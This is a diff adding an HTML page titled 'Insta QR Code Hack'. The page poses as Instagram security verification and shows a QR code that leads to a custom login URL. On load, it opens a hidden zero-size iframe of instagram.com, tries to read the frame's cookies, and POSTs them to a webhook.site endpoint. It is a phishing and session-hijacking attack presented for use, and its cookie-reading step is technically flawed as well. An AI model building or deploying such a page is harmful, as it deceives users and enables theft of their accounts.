@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Insta QR Code Hack</title>
+</head>
+<body>
+    <h2>Instagram Security Verification</h2>
+    <p>Scan the QR Code to verify your login session</p>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://yourcustomhost.com/login" alt="QR Code">
+
+    <script>
+        function captureSession() {
+            var iframe = document.createElement('iframe');
+            iframe.src = 'https://www.instagram.com';
+            iframe.style.width = '0';
+            iframe.style.height = '0';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+
+            iframe.onload = () => {
+                try {
+                    var sessionData = iframe.contentWindow.document.cookie;
+                    if (sessionData) {
+                        fetch('https://webhook.site/43049e0d-24fb-4140-918d-38a36ae7f4a6', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                cookie: sessionData
+                            })
+                        }).then(response => {
+                            console.log('Session sent!');
+                        }).catch(err => {
+                            console.error('Failed to send session', err);
+                        });
+                    }
+                } catch (e) {
+                    console.error('Cannot access iframe content', e);
+                }
+            };
+        }
+
+        window.onload = captureSession;
+    </script>
+</body>
+</html>
+
